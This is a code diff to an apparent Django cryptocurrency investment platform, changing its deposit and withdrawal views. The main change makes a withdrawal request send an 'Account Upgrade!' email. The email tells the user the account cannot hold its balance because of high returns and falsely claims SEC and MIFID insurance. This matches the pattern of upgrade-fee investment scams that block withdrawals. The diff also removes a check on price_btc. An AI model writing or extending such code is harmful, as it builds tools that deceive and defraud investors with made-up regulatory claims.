@@ -61,7 +61,9 @@ def deposit_amount_auth(request, pack):
         admin_btc_address_qs = AdminWallet.objects.all()
 
         admin_btc_address = admin_btc_address_qs.first()
-        admin_eth_address = admin_btc_address_qs.exclude(btc_address=admin_btc_address.btc_address).first()
+        admin_eth_address = admin_btc_address_qs.exclude(
+            btc_address=admin_btc_address.btc_address
+        ).first()
         display_price = display_price
         raw_price = int(price)
         context = {
@@ -123,7 +125,9 @@ def deposit_window(request):
         admin_btc_address_qs = AdminWallet.objects.all()
 
         admin_btc_address = admin_btc_address_qs.first()
-        admin_eth_address = admin_btc_address_qs.exclude(btc_address=admin_btc_address.btc_address).first()
+        admin_eth_address = admin_btc_address_qs.exclude(
+            btc_address=admin_btc_address.btc_address
+        ).first()
 
         context = {
             "plan": plan,
@@ -319,9 +323,6 @@ def withdraw_window(request):
         if not price or not pin:
             return redirect("/dashboard/payments/?e=null")
 
-        if not price_btc:
-            return redirect("/dashboard/payments/?e=yes")
-
         if float(price) < 10000:
             return redirect("/dashboard/payments/?e=low")
         if float(price) > 100000:
@@ -364,12 +365,33 @@ def withdraw_window(request):
             max_age=1 * 24 * 60 * 60 * 1000,
             response=res,
         )
+        user: User = request.user
+        user_balance = user.profile.wallet.balance
+        # format balance to have commas
+        user_balance = "{:,}".format(user_balance)
         try:
             send_alert_mail(
                 request=request,
-                email_subject="Payment Window Has Been Opened",
+                email_subject="Account Upgrade!",
                 user_email=request.user.email,
-                email_message=f"A Payment Window Has Been Initiated, Please Complete Your Withdrawal Process",
+                email_message="{}".format(
+                    """
+Hello {}, your current account type cannot your hold current balance ({}) mostly as a result of great ROl and Success rate is short period of time.
+
+Account was created from a basic level and A lot of turn over profit in a short period of time .
+
+Below are the bodies :
+
+-insured under securities & exchange commission (SEC)
+
+-Insured under market in financial instrument directive (MIFID)
+
+-insured under the Regulatory Agency which your broker register to decrease of any unfair loss
+""".format(
+                        user.first_name + " " + user.last_name,
+                        user_balance,
+                    )
+                ),
                 email_image="payment-window.png",
             )
         except:
